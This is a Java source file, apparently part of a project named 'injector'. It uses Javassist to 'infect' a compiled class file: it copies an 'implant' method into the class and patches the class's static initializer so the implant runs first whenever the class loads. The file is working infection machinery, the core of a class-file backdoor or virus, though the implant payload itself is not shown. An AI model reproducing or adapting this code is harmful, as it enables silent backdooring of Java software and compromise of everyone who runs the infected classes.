package org.example.injector;

import javassist.CtClass;
import javassist.bytecode.*;

import java.io.DataOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.file.Path;
import java.util.HashMap;
import java.util.Objects;

import static org.example.injector.Helpers.readClassFile;
import static org.example.injector.Helpers.setStaticFlagForMethod;

public class MethodInjector {
    private final ImplantHandler implantClass;
    private final String implantMethodName;

    public MethodInjector(ImplantHandler implantClass, String implantMethodName) {
        this.implantClass = implantClass;
        this.implantMethodName = implantMethodName;
    }

    public boolean infectTarget(final Path targetClassFilePath, final Path outputPath) throws IOException {
        final ClassFile targetClass = readClassFile(targetClassFilePath);
        final MethodInfo methodImplant = implantClass.loadFreshSpecimen().getMethod(implantMethodName);

        // Add the implant method to target class
        MethodInfo targetImplantMethod;
        try {
            // Construct a target method from the source (implant) method
            targetImplantMethod = new MethodInfo(targetClass.getConstPool(), methodImplant.getName(), methodImplant.getDescriptor());
            targetImplantMethod.setExceptionsAttribute(methodImplant.getExceptionsAttribute());
            HashMap<String, String> classTranslation = new HashMap<>();
            CodeAttribute copy = (CodeAttribute) methodImplant.getCodeAttribute().copy(targetClass.getConstPool(), classTranslation);
            copy.setMaxLocals(1);  // Don't know why this is necessary, but it throws an error otherwise
            setStaticFlagForMethod(targetImplantMethod);

            targetImplantMethod.getAttributes().removeIf(Objects::isNull);  // Cringe workaround due to internal bug in Javassist
            targetImplantMethod.setCodeAttribute(copy);

            targetClass.addMethod(targetImplantMethod);
        } catch (DuplicateMemberException e) {
            // Class already infected
            return false;
        }

        MethodInfo currentClinit = targetClass.getMethod(MethodInfo.nameClinit);
        if (currentClinit == null) {
            // There are no static blocks in this class, create an empty one
            currentClinit = new MethodInfo(targetClass.getConstPool(), MethodInfo.nameClinit, "()V");
            setStaticFlagForMethod(currentClinit);
            Bytecode stubCode = new Bytecode(targetClass.getConstPool(), 0, 0);
            stubCode.addReturn(CtClass.voidType);
            currentClinit.setCodeAttribute(stubCode.toCodeAttribute());

            try {
                targetClass.addMethod(currentClinit);
            } catch (DuplicateMemberException e) {
                throw new RuntimeException("Internal error: clinit already exist despite not existing", e);
            }
        }

        // Modify the clinit method of the target class to run the implant method (before its own code)
        Bytecode additionalClinitCode = new Bytecode(targetClass.getConstPool());
        additionalClinitCode.addInvokestatic(targetClass.getName(), targetImplantMethod.getName(), targetImplantMethod.getDescriptor());
        CodeAttribute additionalClinitCodeAttr = additionalClinitCode.toCodeAttribute();
        CodeAttribute currentClinitCodeAttr = currentClinit.getCodeAttribute();
        ByteBuffer concatenatedCode = ByteBuffer.allocate(additionalClinitCodeAttr.getCodeLength() + currentClinit.getCodeAttribute().getCodeLength());
        concatenatedCode.put(additionalClinitCodeAttr.getCode());
        concatenatedCode.put(currentClinitCodeAttr.getCode());
        CodeAttribute newCodeAttribute = new CodeAttribute(targetClass.getConstPool(), currentClinitCodeAttr.getMaxStack(), currentClinitCodeAttr.getMaxLocals(), concatenatedCode.array(), currentClinitCodeAttr.getExceptionTable());
        currentClinit.setCodeAttribute(newCodeAttribute);

        targetClass.write(new DataOutputStream(new FileOutputStream(outputPath.toFile())));

        return true;
    }
}